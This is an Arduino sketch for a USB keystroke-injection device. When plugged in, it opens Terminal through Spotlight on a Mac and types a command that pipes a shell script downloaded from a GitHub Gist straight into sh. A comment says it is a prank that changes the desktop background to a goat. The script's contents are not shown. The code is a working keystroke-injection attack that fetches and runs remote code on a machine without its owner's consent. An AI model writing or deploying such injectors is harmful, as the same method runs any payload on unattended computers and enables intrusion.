#include <Keyboard.h>

// Constants for timing and keyboard shortcuts
const int INIT_DELAY = 2000;
const int APP_LAUNCH_DELAY = 2000;   // Delay for app launcher or Spotlight
const int SHORT_DELAY = 200;         // Short delay for UI interactions
const int TYPING_DELAY = 10;

void setup() {
  Keyboard.begin();
  delay(INIT_DELAY);
  changeDesktopBackground();
  Keyboard.end();
}

void loop() {
  // No repeated actions needed
}

// Function to change desktop background to goat image
void changeDesktopBackground() {
  // Open terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(APP_LAUNCH_DELAY);

  typeMessage("terminal");
  Keyboard.write(KEY_RETURN);
  delay(SHORT_DELAY);

  delay(APP_LAUNCH_DELAY);

  // Type the command
  typeMessage("curl https://gist.githubusercontent.com/SjoenH/3facbd8f87bc25e421553b3b5eb00a6b/raw/931ca4786de0fa326e71458c20ce050baff6ca82/goat.sh | sh");
  Keyboard.write(KEY_RETURN);
  delay(SHORT_DELAY);
}

void typeMessage(String message) {
  for (int i = 0; i < message.length(); i++) {
    char c = message[i];
    switch (c) {
      case ':':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.press('.');
        delay(TYPING_DELAY);
        Keyboard.releaseAll();
        break;
      case '!':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.press('1');
        delay(TYPING_DELAY);
        Keyboard.releaseAll();
        break;
      case '-':
        Keyboard.press('-');
        delay(TYPING_DELAY);
        Keyboard.releaseAll();
        break;
      case '/':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.press('7');
        delay(TYPING_DELAY);
        Keyboard.releaseAll();
        break;
      case ' ':
        Keyboard.press(' ');
        delay(TYPING_DELAY);
        Keyboard.releaseAll();
        break;
      case '|':
        Keyboard.press(KEY_RIGHT_ALT);
        Keyboard.press('7');
        delay(TYPING_DELAY);
        Keyboard.releaseAll();
        break;
      default:
        Keyboard.print(c);
        Keyboard.releaseAll();
        break;
    }
    delay(TYPING_DELAY);  // Slight delay between each key press
  }
  Keyboard.write(KEY_RETURN);  // Press Enter to send the message
  delay(SHORT_DELAY);         // Wait for a short moment to ensure message is sent
  Keyboard.releaseAll();
}